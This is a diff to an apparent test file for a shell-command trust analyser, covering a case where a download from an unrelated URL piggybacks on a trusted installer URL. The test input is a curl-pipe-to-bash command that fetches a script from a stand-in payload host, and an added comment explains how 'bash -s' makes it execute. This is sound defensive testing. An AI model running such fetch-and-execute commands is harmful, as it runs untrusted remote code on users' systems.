@@ -87,9 +87,11 @@ def test_trusted_text_in_attacker_query_does_not_inherit_installer_trust(tmp_pat
 
 
 def test_unrelated_execution_side_url_cannot_trust_downloader(tmp_path: Path) -> None:
+    # ``bash -s`` runs stdin and passes the URL as $1, so the payload does execute. (Without
+    # -s, bash would treat the URL as a script path and never read the fetched bytes.)
     finding = _pipeline(
         tmp_path,
-        "curl https://payload.example/agent.sh | bash https://install.example.com/help",
+        "curl https://payload.example/agent.sh | bash -s https://install.example.com/help",
     )
     semantic = finding.metadata["semantic_facts"]
 
